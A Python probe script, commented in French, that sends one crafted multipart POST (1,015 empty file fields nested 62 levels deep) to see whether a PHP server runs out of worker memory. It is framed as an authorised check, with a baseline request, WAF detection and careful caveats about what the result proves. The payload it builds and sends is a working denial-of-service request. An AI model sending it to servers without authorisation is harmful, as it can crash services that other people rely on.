#!/usr/bin/env python3
"""Sonde à distance une erreur OOM lors du traitement d'un POST multipart.

Envoie une seule fois le POST multipart qui a déclenché un OOM dans un lab
PHP 8.2.34. La requête contient 1 015 contrôles de fichier vides avec des noms
imbriqués sur 62 niveaux. Elle peut épuiser la mémoire d'un worker PHP, même
corrigé. À utiliser uniquement sur un serveur autorisé.

Un OOM prouve seulement que cette requête a épuisé la mémoire du worker. Il ne
prouve ni corruption mémoire, ni exécution de code, ni exploitabilité de
CVE-2026-109618 ou CVE-2026-109619. Un résultat sans OOM ne prouve pas que le
serveur est corrigé : un WAF ou une configuration peut le masquer.
"""

import argparse
import datetime as dt
import hashlib
import re
import sys
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass
from email.message import Message


BOUNDARY = "----php2shbndry"
PARTS = 1015
NESTING = 61  # f[0] et 61 fois [a] : 62 niveaux de crochets.
PAYLOAD_BYTES = 310516
PAYLOAD_SHA256 = "d43aba3ac2d3691b2e6f78c92c3cc774cd32680127b46781821b40d59d112321"
OOM_PATTERN = re.compile(rb"Allowed memory size of\s+\d+\s+bytes exhausted", re.I)
TRACE_HEADERS = (
    "X-Request-ID", "X-Correlation-ID", "CF-Ray", "X-WAF-Action", "CF-Mitigated", "X-Powered-By"
)


class NoRedirects(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, request, file, code, message, headers, new_url):
        return None


@dataclass
class Response:
    status: int
    headers: Message
    body: bytes


def payload() -> bytes:
    fields = []
    for index in range(PARTS):
        name = f"f[{index}]" + "[a]" * NESTING
        fields.append(
            f"--{BOUNDARY}\r\n"
            f'Content-Disposition: form-data; name="{name}"; filename=""\r\n'
            "Content-Type: application/octet-stream\r\n"
            "\r\n"
            "\r\n"
        )
    fields.append(f"--{BOUNDARY}--\r\n")
    body = "".join(fields).encode("ascii")
    if len(body) != PAYLOAD_BYTES or hashlib.sha256(body).hexdigest() != PAYLOAD_SHA256:
        raise RuntimeError("La charge générée diffère de la requête capturée dans le lab")
    return body


def send(opener, request: urllib.request.Request, timeout: float) -> Response:
    try:
        with opener.open(request, timeout=timeout) as answer:
            return Response(answer.status, answer.headers, answer.read(65536))
    except urllib.error.HTTPError as error:
        try:
            return Response(error.code, error.headers, error.read(65536))
        finally:
            error.close()


def show(label: str, response: Response) -> None:
    print(f"{label} : HTTP {response.status}")
    for name in TRACE_HEADERS:
        value = response.headers.get(name)
        if value:
            print(f"  {name}: {value[:120]}")


def parse_statuses(value: str) -> set[int]:
    try:
        statuses = {int(item.strip()) for item in value.split(",")}
    except ValueError as error:
        raise argparse.ArgumentTypeError("codes HTTP séparés par des virgules") from error
    if not statuses or any(status < 100 or status > 599 for status in statuses):
        raise argparse.ArgumentTypeError("codes HTTP entre 100 et 599")
    return statuses


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("url", help="URL HTTP(S) du script PHP à contrôler")
    parser.add_argument("--timeout", type=float, default=15.0, help="Délai par requête (défaut : 15 s)")
    parser.add_argument(
        "--user-agent", default="php2shell-oom-check/1.0",
        help="User-Agent des deux requêtes (défaut : php2shell-oom-check/1.0)",
    )
    parser.add_argument(
        "--block-status", type=parse_statuses, default={403, 406, 413, 429},
        help="Codes de rejet attendus pour le POST (défaut : 403,406,413,429)",
    )
    args = parser.parse_args()
    target = urllib.parse.urlsplit(args.url)
    if target.scheme not in ("http", "https") or not target.hostname or target.username or target.password:
        parser.error("URL http:// ou https:// sans identifiants intégrés requise")
    if not 0 < args.timeout <= 30:
        parser.error("--timeout doit être compris entre 0 et 30 secondes")
    if not 1 <= len(args.user_agent) <= 120 or any(ord(char) < 32 or ord(char) > 126 for char in args.user_agent):
        parser.error("--user-agent doit contenir 1 à 120 caractères ASCII imprimables")

    opener = urllib.request.build_opener(urllib.request.ProxyHandler({}), NoRedirects())
    headers = {"User-Agent": args.user_agent}
    print(f"UTC : {dt.datetime.now(dt.timezone.utc).isoformat(timespec='seconds')}")
    print(f"Cible : {args.url}")

    try:
        baseline = send(opener, urllib.request.Request(args.url, headers=headers, method="GET"), args.timeout)
    except (urllib.error.URLError, TimeoutError, OSError) as error:
        print(f"INDÉTERMINÉ : GET témoin impossible ({error})")
        return 2
    show("GET témoin", baseline)
    if baseline.status in args.block_status or 300 <= baseline.status < 400:
        print("INDÉTERMINÉ : le témoin est rejeté ou redirigé ; charge non envoyée")
        return 2

    body = payload()
    request = urllib.request.Request(
        args.url, data=body, method="POST",
        headers={**headers, "Content-Type": f"multipart/form-data; boundary={BOUNDARY}"},
    )
    print(f"POST de contrôle : {len(body)} octets, {PARTS} champs, 62 niveaux ; une seule tentative")
    try:
        answer = send(opener, request, args.timeout)
    except (urllib.error.URLError, TimeoutError, OSError) as error:
        print(f"INDÉTERMINÉ : POST interrompu ({error}) ; vérifier les journaux PHP et WAF")
        return 2
    show("POST de contrôle", answer)

    if OOM_PATTERN.search(answer.body):
        print("OOM PHP OBSERVÉ : cette requête a épuisé la mémoire du worker.")
        print("Ce signal n'établit ni version vulnérable, ni corruption mémoire, ni exécution de code.")
        return 1
    if answer.status in args.block_status:
        print("REJET DIFFÉRENTIEL : la charge a été bloquée ; confirmer l'action dans les journaux du WAF.")
        return 0
    print("INDÉTERMINÉ : aucun OOM visible. Le serveur peut être corrigé, filtré ou configuré autrement.")
    return 2


if __name__ == "__main__":
    if hasattr(sys.stdout, "reconfigure"):
        sys.stdout.reconfigure(encoding="utf-8")
        sys.stderr.reconfigure(encoding="utf-8")
    sys.exit(main())
